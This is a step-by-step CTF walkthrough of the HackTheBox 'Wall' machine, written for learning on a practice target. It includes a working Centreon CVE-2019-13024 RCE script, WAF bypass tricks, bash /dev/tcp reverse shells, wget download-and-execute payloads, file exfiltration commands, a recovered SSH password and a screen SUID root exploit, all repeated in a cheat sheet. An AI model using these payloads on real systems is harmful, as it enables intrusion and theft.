# HackTheBox: Wall - Comprehensive Walkthrough

**Machine:** Wall  
**OS:** Linux  
**Difficulty:** Medium  
**Target IP:** `10.129.2.9`  
**Attacker IP:** `10.10.16.84`  
**User Flag:** `eb1b6[redacted]32408`  
**Root Flag:** `1fcad[redacted]814b40`

---

## Table of Contents

1. [Introduction & Attack Overview](#introduction--attack-overview)
2. [Step 1: Reconnaissance with Nmap](#step-1-reconnaissance-with-nmap)
3. [Step 2: Web Enumeration](#step-2-web-enumeration)
4. [Step 3: HTTP Verb Tampering](#step-3-http-verb-tampering)
5. [Step 4: Centreon Discovery & Credential Brute Force](#step-4-centreon-discovery--credential-brute-force)
6. [Step 5: Centreon RCE Exploitation (CVE-2019-13024)](#step-5-centreon-rce-exploitation-cve-2019-13024)
7. [Step 6: WAF Bypass & Reverse Shell](#step-6-waf-bypass--reverse-shell)
8. [Step 7: Privilege Escalation to `shelby`](#step-7-privilege-escalation-to-shelby)
9. [Step 8: Privilege Escalation to `root`](#step-8-privilege-escalation-to-root)
10. [Key Lessons & Mindset](#key-lessons--mindset)

---

## Introduction & Attack Overview

Welcome. This walkthrough covers the **Wall** machine from HackTheBox. Wall is a Linux box rated "Medium" that teaches several important offensive security concepts:

- **HTTP Verb Tampering:** A common misconfiguration where authentication is only enforced on certain HTTP methods.
- **Web Application Firewall (WAF) Bypass:** Learning to adapt payloads when security controls block your attacks.
- **Authenticated RCE:** Exploiting vulnerable web applications after obtaining credentials.
- **Bytecode Analysis:** Recovering secrets from compiled Python files.
- **SUID Binary Exploitation:** Leveraging misconfigured setuid binaries to escalate privileges.

### The Complete Attack Chain

```
Nmap Scan → Gobuster → HTTP Verb Tampering → Centreon Login
    ↓
Centreon RCE via CVE-2019-13024 (with WAF bypass)
    ↓
Shell as www-data → Decompile backup.pyc → SSH as shelby
    ↓
Exploit SUID screen-4.5.0 → ROOT
```

---

## Step 1: Reconnaissance with Nmap

### The Command

```bash
nmap -sC -sV -p- --min-rate 10000 -oN nmap_wall.txt 10.129.2.9
```

### Breaking It Down (Baby Steps)

Let's understand every flag:

| Flag | Meaning | Why We Use It |
|------|---------|---------------|
| `-sC` | Run default NSE scripts | Automatically checks for common vulnerabilities, banner grabbing, and service info |
| `-sV` | Version detection | Tells us exactly what software and version is running |
| `-p-` | Scan all 65,535 TCP ports | We don't want to miss non-standard ports |
| `--min-rate 10000` | Send at least 10,000 packets/second | Speeds up the full port scan significantly |
| `-oN nmap_wall.txt` | Save output in normal format | Documentation and reference for later |

### Hacker Mindset

> **"You can't attack what you don't know exists."**
>
> Reconnaissance is the foundation of every successful penetration test. We're building a map of the target's attack surface. Every open port is a potential entry point. We scan all ports because experienced administrators and CTF creators often hide services on high ports.

### Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Analysis

We found exactly two open ports:
- **Port 22 (SSH):** OpenSSH 7.6p1 on Ubuntu. This version isn't obviously vulnerable to any unauthenticated exploits, so SSH will likely be our *later-stage* access method, not our entry point.
- **Port 80 (HTTP):** Apache 2.4.29. This is our initial attack surface.

The Apache default page title `"Apache2 Ubuntu Default Page: It works"` tells us the web server hasn't been heavily customized. This often means hidden applications, directories, or default configurations are waiting to be discovered.

---

## Step 2: Web Enumeration

### The Command

```bash
gobuster dir -u http://10.129.2.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
```

### Breaking It Down

| Flag | Meaning |
|------|---------|
| `dir` | Directory enumeration mode |
| `-u` | Target URL |
| `-w` | Wordlist to use |
| `-x php,txt` | Also check for files with these extensions |
| `-t 40` | Use 40 threads for speed |

### Hacker Mindset

> **"Default pages hide secrets."**
>
> When you see a default Apache page, the real application is usually accessible through a subdirectory or virtual host. Directory brute-forcing is how we discover these hidden paths. We're essentially guessing URLs that the developer didn't intend for users to find directly.

### Results

```
aa.php               (Status: 200) [Size: 1]
monitoring           (Status: 401) [Size: 457]
panel.php            (Status: 200) [Size: 26]
```

### Analysis

- **`aa.php` (200, size 1):** Suspicious. The name "aa.php" is unusual—like a quick test file. Returns just "1". These are often **troll files** left by CTF creators to waste time. Note them, but don't obsess.
- **`panel.php` (200, size 26):** Returns `"Just a test for php file !"`. Another test/troll file.
- **`monitoring` (401, size 457):** This is interesting. **401 Unauthorized** means the directory exists but requires authentication.

The 401 status is actually valuable information: it confirms a real directory exists behind the protection. Our next question is: *how is this authentication implemented, and can we bypass it?*

---

## Step 3: HTTP Verb Tampering

### The Concept (Important!)

HTTP supports multiple methods (verbs): `GET`, `POST`, `PUT`, `DELETE`, `HEAD`, `OPTIONS`, `TRACE`, `PATCH`, etc.

Web servers can enforce access controls per method. A common misconfiguration is:

```apache
<Limit GET>
require valid-user
</Limit>
```

This says: "Only require authentication for GET requests." But what about POST, PUT, or HEAD? They might be **unprotected**.

### Why Does This Happen?

Developers often think: "If someone visits this page in a browser, they need to log in." Browsers primarily use GET, so they only protect GET. They forget that scripts, APIs, and attackers can use other methods.

### The Test

When we visit `/monitoring` in a browser (GET request), we see an authentication prompt:

```bash
curl http://10.129.2.9/monitoring/
# Returns: 401 Unauthorized
```

But what if we send a POST request instead?

```bash
curl -X POST http://10.129.2.9/monitoring/
```

### The Result

```html
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

### Hacker Mindset

> **"Authentication is not just about credentials—it's about how and where it's enforced."**
>
> We didn't crack a password. We simply changed the *type* of request. This is a critical mindset shift: security controls are implemented by code/configuration, and code often has edge cases. Always test:
> - Different HTTP methods
> - Case variations (`GET` vs `get`)
> - Extra headers
> - Path variations (trailing slashes, encoding, etc.)

### What We Learned

The POST request to `/monitoring` redirects us to `/centreon`. We now know a **Centreon** instance is running at `http://10.129.2.9/centreon/`.

Centreon is an open-source IT infrastructure monitoring platform. Historically, it has had several vulnerabilities, including authenticated RCE.

---

## Step 4: Centreon Discovery & Credential Brute Force

### Visiting Centreon

Navigate to `http://10.129.2.9/centreon/` in your browser. You'll see a login page.

**Key observation:** Check the version displayed at the bottom of the login page. For Wall, it's **Centreon v19.04**.

### Hacker Mindset

> **"Version numbers are cheat codes."**
>
> When you know the exact software version, you can search for known vulnerabilities and exploits. Centreon 19.04 is known to be vulnerable to **CVE-2019-13024**, an authenticated Remote Code Execution vulnerability. But first, we need credentials.

### The Brute Force Problem

The Centreon web login form uses CSRF tokens:

```
POST /centreon/index.php HTTP/1.1
...
useralias=admin&password=admin&submitLogin=Connect&centreon_token=8401dc563787157a951dfea15f0bcf44
```

Each page load generates a new token, making tools like Hydra difficult to use directly.

### The API Shortcut

Centreon provides an API endpoint that doesn't require CSRF tokens:

```
POST /centreon/api/index.php?action=authenticate
```

With parameters:
```
username=admin&password=PASSWORD
```

If credentials are wrong, it returns `"Bad credentials"`.  
If correct, it returns a JSON auth token:
```json
{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
```

### Testing the Known Credentials

```bash
curl -s http://10.129.2.9/centreon/api/index.php?action=authenticate \
  -d "username=admin&password=password1"
```

**Result:**
```json
{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
```

### Hacker Mindset

> **"Look for the easiest path."**
>
> When a web form has anti-automation protections (CSRF tokens, rate limiting, CAPTCHAs), look for alternative authentication mechanisms. APIs, mobile endpoints, and legacy interfaces often have weaker protections than the main web UI.
>
> In this case, the Centreon API was the perfect brute-force target. The password `password1` is also an excellent reminder that **even "secure" enterprise software gets deployed with weak credentials**.

---

## Step 5: Centreon RCE Exploitation (CVE-2019-13024)

### Understanding the Vulnerability

**CVE-2019-13024** is an authenticated Remote Code Execution in Centreon 19.04. It exists in the **Poller Configuration** page, specifically in the field called **"Monitoring Engine Binary"** (also referenced as `nagios_bin`).

When the application generates monitoring configuration files, it shell-executes whatever command is in this field. Because the input isn't properly sanitized, an attacker can inject arbitrary system commands.

### The Attack Flow

1. Log in to Centreon
2. Navigate to **Configuration → Pollers**
3. Edit the "Central" poller
4. Change the "Monitoring Engine Binary" field to a malicious command
5. Save the configuration
6. Trigger configuration generation via `/include/configuration/configGenerate/xml/generateFiles.php`
7. The server executes our command

### Building the Exploit Script

Rather than clicking through the browser every time, we automate with Python. Here's the script we created:

```python
#!/usr/bin/env python3
import re
import requests
import sys
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) != 5:
    print("[~] Usage : ./centreon-exploit.py url username password command")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
command = sys.argv[4].replace(" ", '${IFS}')

request = requests.session()

print("[+] Retrieving CSRF token")
page = request.get(url + "/index.php")
soup = BeautifulSoup(page.text, features="lxml")
token = soup.find('input', {'name': 'centreon_token'}).get("value")

login_info = {
    "useralias": username,
    "password": password,
    "submitLogin": "Connect",
    "centreon_token": token
}
login_request = request.post(url + "/index.php", data=login_info)
print("[+] Login token is : {}".format(token))

if "Your credentials are incorrect." in login_request.text:
    print("[-] Wrong credentials")
    sys.exit()

print("[+] Logged in successfully")
print("[+] Retrieving Poller token")

poller_configuration_page = url + "/main.get.php?p=60901"
get_poller_token = request.get(poller_configuration_page)
poller_soup = BeautifulSoup(get_poller_token.text, features="lxml")
poller_token = poller_soup.find('input', {'name': 'centreon_token'}).get("value")
print("[+] Poller token is : {}".format(poller_token))

payload_info = {
    "name": "Central",
    "ns_ip_address": "127.0.0.1",
    "localhost[localhost]": "1",
    "is_default[is_default]": "0",
    "remote_id": "",
    "ssh_port": "22",
    "init_script": "centengine",
    "nagios_bin": "{}||".format(command),
    "nagiostats_bin": "/usr/sbin/centenginestats",
    "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
    "centreonbroker_cfg_path": "/etc/centreon-broker",
    "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
    "centreonbroker_logs_path": "",
    "centreonconnector_path": "/usr/lib64/centreon-connector",
    "init_script_centreontrapd": "centreontrapd",
    "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
    "ns_activate[ns_activate]": "1",
    "submitC": "Save",
    "id": "1",
    "o": "c",
    "centreon_token": poller_token,
}

send_payload = request.post(poller_configuration_page, data=payload_info)
print("[*] Payload inject status code: {}".format(send_payload.status_code))
if send_payload.status_code == 403:
    print("[-] WAF blocked command. Try something else")
    sys.exit()

print("[+] Injecting done, triggering the payload")
generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
xml_page_data = {
    "poller": "1",
    "debug": "true",
    "generate": "true",
}
try:
    resp = request.post(generate_xml_page, data=xml_page_data, timeout=10)
    res = re.findall(r"id='debug_1'>(.*?)<br><br></div><br/>]]", resp.text, re.DOTALL)
    if res:
        print(res[0].replace('<br>', '\n'))
except requests.Timeout:
    print("[*] Request timed out (this is normal for reverse shells)")
except Exception as e:
    print("[-] Error: {}".format(e))
```

### Why This Script Works

1. **Session Management:** Uses `requests.session()` to maintain cookies across requests
2. **CSRF Token Extraction:** BeautifulSoup extracts dynamic tokens from HTML forms
3. **Login:** Posts credentials to `/index.php`
4. **Poller Token Extraction:** Gets the second CSRF token from the poller config page
5. **Payload Injection:** Submits the malicious command in `nagios_bin`
6. **Trigger:** Calls `generateFiles.php` to execute the payload

### Testing with `id`

```bash
python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 "id"
```

**Result:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
```

### Hacker Mindset

> **"Start safe, then go loud."**
>
> Before attempting a reverse shell, always test with a harmless command like `id` or `whoami`. This confirms your exploit chain works without the complexity of network callbacks. If `id` fails, you know the problem isn't your listener—it's the payload or the exploit itself.

---

## Step 6: WAF Bypass & Reverse Shell

### Discovering the WAF

Initially, you might try a simple reverse shell:

```bash
ncat -e /bin/bash 10.10.16.84 443
```

But the exploit returns **HTTP 403 Forbidden**. Something is blocking us.

### WAF Analysis

The Wall box runs **ModSecurity** with custom rules in `/etc/modsecurity/modsecurity.conf`:

```
# block nc word
SecRule REQUEST_BODY "\bnc\b" "id:00001,deny,msg:'blocked'"

# block ncat word
SecRule REQUEST_BODY "\bncat\b" "id:00002,deny,msg:'blocked'"

# block passwd word
SecRule REQUEST_BODY "\bpasswd\b" "id:00003,deny,msg:'blocked'"

# block # char
SecRule REQUEST_BODY "%23" "id:00004,deny,msg:'blocked'"

# block any whitespace
SecRule REQUEST_BODY "\+" "id:00005,deny,msg:'blocked'"

# block hostname word
SecRule REQUEST_BODY "\bhostname\b" "id:00006,deny,msg:'blocked'"
```

The WAF blocks:
- `nc` and `ncat`
- `passwd`
- The `#` character (URL-encoded as `%23`)
- **Spaces** (the `+` rule in URL-encoded POST bodies)
- `hostname`

### Why Spaces Are Blocked

In `application/x-www-form-urlencoded` POST data, spaces are encoded as `+`. The WAF rule `\+` blocks these. This means **we cannot use literal spaces in our payloads**.

### The Bypass: `${IFS}`

Bash has a built-in variable called **`IFS`** (Internal Field Separator). By default, it contains whitespace characters (space, tab, newline). We can reference it as `${IFS}` to insert a space-like separator **without using an actual space character**.

Example:
```bash
# Blocked by WAF:
nc -e /bin/bash 10.10.16.84 443

# Bypassed:
nc${IFS}-e${IFS}/bin/bash${IFS}10.10.16.84${IFS}443
```

### Hacker Mindset

> **"When the front door is locked, check the windows, the chimney, and the dog door."**
>
> A WAF is not invincible—it's a filter. Filters can be bypassed by:
> - Encoding (base64, URL encoding, hex)
> - Alternative syntax (`${IFS}` instead of space)
> - Command substitution (`$(printf '%s' ...)`)
> - Case manipulation (though not always effective)
> - Fragmenting attacks across multiple requests
>
> The key is understanding **what exactly the WAF is looking for** and presenting your payload in a way that doesn't match those patterns.

### Setting Up the Reverse Shell

We use a **staged approach**: download a shell script from our Kali machine, then execute it.

**Step 1:** Create the shell script on Kali:

```bash
cd ~/Downloads/htb
cat > shell << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/443 0>&1
EOF
```

This bash one-liner is a classic TCP reverse shell:
- `bash -i` starts an interactive bash session
- `>& /dev/tcp/10.10.16.84/443` redirects stdout and stderr to a TCP connection
- `0>&1` redirects stdin from the same connection

**Step 2:** Start a Python HTTP server to serve the script:

```bash
python3 -m http.server 80
```

**Step 3:** Start a netcat listener:

```bash
nc -lnvp 443
```

**Step 4:** Trigger the download and execution:

```bash
python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 \
  'wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito'
```

### Payload Breakdown

```
wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito
```

With spaces restored, this is:
```bash
wget http://10.10.16.84/shell -O /tmp/yakuhito; bash /tmp/yakuhito
```

- `wget` downloads our shell script
- `-O /tmp/yakuhito` saves it to `/tmp`
- `;` separates commands
- `bash /tmp/yakuhito` executes the reverse shell

### Result

On our netcat listener:

```
connect to [10.10.16.84] from (UNKNOWN) [10.129.2.9] 56734
bash: cannot set terminal process group (1241): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
```

We now have a shell as `www-data`.

### Stabilizing the Shell (Optional but Recommended)

For a more stable shell, run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z to background
# On Kali:
stty raw -echo; fg
# Then press Enter twice
export TERM=xterm
```

---

## Step 7: Privilege Escalation to `shelby`

### Enumeration as `www-data`

With our initial shell, we start looking for privilege escalation paths:

```bash
# Look for interesting files in /opt
ls -la /opt/

# Look for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check running processes
ps aux

# Check sudo privileges
sudo -l
```

### Discovery

In `/opt/`, we find a hidden directory:

```bash
www-data@Wall:/$ ls -la /opt/
total 12
drwxr-xr-x  3 root root 4096 Jul  4 17:28 .
drwxr-xr-x 23 root root 4096 Jul  4 00:25 ..
drwxr-xr-x  2 root root 4096 Jul 30 17:39 .shelby
```

Inside:

```bash
www-data@Wall:/$ ls -la /opt/.shelby/
total 12
drwxr-xr-x 2 root root 4096 Jul 30 17:39 .
drwxr-xr-x 3 root root 4096 Jul  4 17:28 ..
-rwxr-xr-x 1 root root  981 Jul 30 17:39 backup
```

```bash
www-data@Wall:/$ file /opt/.shelby/backup
/opt/.shelby/backup: python 2.7 byte-compiled
```

### Understanding Python Bytecode (`.pyc`)

When you run a Python script, Python can compile it to bytecode and save it as a `.pyc` file. This is **not source code**—it's an intermediate representation. However, it can be decompiled back to approximately the original source code.

This is a **goldmine** for attackers because:
1. Developers often compile scripts to "hide" credentials
2. Bytecode still contains strings, logic flow, and embedded secrets
3. Tools like `uncompyle6` can recover the source

### Transferring the File to Kali

Method 1: Netcat

On Kali:
```bash
nc -lnvp 9001 > backup.pyc
```

On target:
```bash
cat /opt/.shelby/backup > /dev/tcp/10.10.16.84/9001
```

Method 2: Base64

On target:
```bash
base64 /opt/.shelby/backup
```

On Kali:
```bash
echo "<paste base64>" | base64 -d > backup.pyc
```

### Decompiling with `uncompyle6`

Install if needed:
```bash
pip3 install uncompyle6
```

Decompile:
```bash
uncompyle6 backup.pyc
```

### The Decompiled Source

```python
import paramiko
username = 'shelby'
host = 'wall.htb'
port = 22
transport = paramiko.Transport((host, port))
password = ''
password += chr(ord('S'))
password += chr(ord('h'))
password += chr(ord('e'))
password += chr(ord('l'))
password += chr(ord('b'))
password += chr(ord('y'))
password += chr(ord('P'))
password += chr(ord('a'))
password += chr(ord('s'))
password += chr(ord('s'))
password += chr(ord('w'))
password += chr(ord('@'))
password += chr(ord('r'))
password += chr(ord('d'))
password += chr(ord('I'))
password += chr(ord('s'))
password += chr(ord('S'))
password += chr(ord('t'))
password += chr(ord('r'))
password += chr(ord('o'))
password += chr(ord('n'))
password += chr(ord('g'))
password += chr(ord('!'))
transport.connect(username=username, password=password)
sftp_client = paramiko.SFTPClient.from_transport(transport)
sftp_client.put('/var/www/html.zip', 'html.zip')
print '[+] Done !'
```

### Why Did the Developer Do This?

The password is built character-by-character using `chr(ord())`. The developer probably thought:
> "If I don't put the literal password string in the file, someone reading it won't see the password."

This is **security through obscurity**. It stops casual `strings` or `grep` searches, but it doesn't stop someone who decompiles the bytecode.

### Extracting the Password

Reading the code, the password is:

```
ShelbyPassw@rdIsStrong!
```

### SSH as `shelby`

```bash
ssh shelby@10.129.2.9
# Password: ShelbyPassw@rdIsStrong!
```

### Hacker Mindset

> **"Compiled doesn't mean protected."**
>
> Never assume compiled or obfuscated code is secure. If the runtime can execute it, a determined attacker can reverse it. Always look for:
> - `.pyc` files
> - Java `.class` / `.jar` files
> - .NET assemblies
> - Native binaries with embedded strings
> - Configuration files with hardcoded credentials

### Capturing the User Flag

```bash
shelby@Wall:~$ cat ~/user.txt
eb1b6[redacted]39fa32408
```

---

## Step 8: Privilege Escalation to `root`

### Enumeration as `shelby`

Now that we're a real user, we run our privilege escalation checks again:

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel exploits
uname -a

# Sudo privileges
sudo -l

# Interesting cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

### The Discovery: SUID `screen-4.5.0`

```bash
shelby@Wall:~$ find / -perm -4000 -type f 2>/dev/null | grep screen
/bin/screen-4.5.0
```

The `screen` binary is a terminal multiplexer. Version 4.5.0 has a **known local privilege escalation vulnerability** because it is installed SUID root and mishandles certain file operations.

### Understanding SUID

SUID (Set User ID) is a Linux permission flag. When a SUID binary is executed, it runs with the permissions of its **owner**, not the user who launched it.

If root owns a SUID binary, anyone who runs it temporarily becomes root during execution.

```
-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
     ↑
     The 's' means SUID is set
```

### Why Is This Exploitable?

Screen 4.5.0 tries to create and manage log files in `/etc/` and `/tmp/`. Because it runs as root, an attacker can trick it into:
1. Creating `/etc/ld.so.preload` (a file that tells the dynamic linker which libraries to preload)
2. Preloading a malicious shared library into any new root process
3. That library creates a SUID root shell

### The Exploit: screenroot.sh

We use the public exploit from the XiphosResearch repository.

### Transferring the Exploit

On Kali, download it:
```bash
curl -sL https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh \
  -o ~/Downloads/htb/screenroot.sh
```

Serve it:
```bash
cd ~/Downloads/htb
python3 -m http.server 8080
```

On the target, download and execute:
```bash
wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
bash /dev/shm/screenroot.sh
```

### Alternative: Inline Base64

If you don't have internet on Kali, you can base64-encode the exploit and paste it directly:

```bash
cd /dev/shm
echo "<BASE64_OF_SCREENROOT.SH>" | base64 -d > .a.sh
bash .a.sh
```

### What the Exploit Does

1. **Creates `/tmp/libhax.c`:** A C library with a constructor function that runs automatically when loaded
2. **Compiles it to `/tmp/libhax.so`:** This library will:
   - Change ownership of `/tmp/rootshell` to root
   - Set it SUID (permissions 4755)
   - Remove the preload file to clean up
3. **Creates `/tmp/rootshell.c`:** A simple C program that launches `/bin/sh` as root
4. **Creates `/etc/ld.so.preload` using screen's log feature:** This tricks screen (running as root) into creating the preload file with our malicious library path
5. **Triggers screen:** When screen runs, it loads our library as root
6. **Executes `/tmp/rootshell`:** Now SUID root, giving us a root shell

### The Result

```
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),6001(shelby)
```

### Hacker Mindset

> **"SUID is a privilege escalation magnet."**
>
> Any non-standard SUID binary should immediately catch your attention. Ask:
> - Is this binary supposed to be SUID?
> - What version is it? Are there known exploits?
> - Can I write to files it reads/writes?
> - Can I manipulate its environment?
>
> For `screen-4.5.0`, a quick search for "screen 4.5.0 SUID exploit" returns multiple working proofs-of-concept. When you find a SUID binary, **Google is your best friend.**

### Capturing the Root Flag

```bash
# cat /root/root.txt
1fca[redacted]4b40
```

---

## Key Lessons & Mindset

### 1. Always Test Multiple HTTP Methods

A 401 on GET doesn't mean a resource is fully protected. HTTP verb tampering is an easy win that many testers miss because they only test with browsers or standard tools.

### 2. APIs Are Often Weaker Than Web Interfaces

The Centreon web login had CSRF protection; the API didn't. When you encounter protections on the main application, look for mobile apps, API endpoints, developer tools, or legacy interfaces.

### 3. WAFs Are Filters, Not Impenetrable Walls

A WAF blocks known patterns. Your job is to present known attacks in unknown ways. On Wall, we used:
- `${IFS}` to bypass the space filter
- Base64-encoded payloads to avoid keyword detection
- Staged payloads (download-then-execute) to reduce WAF exposure

### 4. Bytecode and Compiled Files Hide Secrets Poorly

Developers often "hide" credentials in compiled files, thinking they're secure. Tools like `uncompyle6`, `jd-gui`, `dnSpy`, and `Ghidra` make recovery trivial. Always check for `.pyc`, `.jar`, `.exe`, and other compiled artifacts.

### 5. SUID Binaries Are Privilege Escalation Gold

`find / -perm -4000` should be in every enumeration script. Any unexpected SUID binary is worth investigating. Version-specific exploits against SUID binaries are common and reliable.

### 6. Build Your Exploits Incrementally

Don't start with a reverse shell. Start with `id`. Confirm each step works before adding complexity. This makes debugging much faster and gives you confidence in your attack chain.

### 7. Document Everything

Save your Nmap output, exploit scripts, and command history. Not only is this good practice for reports, but it also helps you reproduce the attack and learn from it later.

---

## Final Commands Cheat Sheet

```bash
# Recon
nmap -sC -sV -p- --min-rate 10000 -oN nmap_wall.txt 10.129.2.9

# Web enum
gobuster dir -u http://10.129.2.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40

# HTTP verb tampering
curl -X POST http://10.129.2.9/monitoring/

# Centreon API brute force
curl -s http://10.129.2.9/centreon/api/index.php?action=authenticate -d "username=admin&password=password1"

# Centreon RCE test
python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 "id"

# Reverse shell payload
python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 \
  'wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito'

# Transfer backup.pyc
nc -lnvp 9001 > backup.pyc                  # Kali
cat /opt/.shelby/backup > /dev/tcp/10.10.16.84/9001  # Target

# Decompile
uncompyle6 backup.pyc

# SSH
ssh shelby@10.129.2.9  # ShelbyPassw@rdIsStrong!

# Root via screen
wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
bash /dev/shm/screenroot.sh
```

---

**Happy Hacking!** 🏴‍☠️
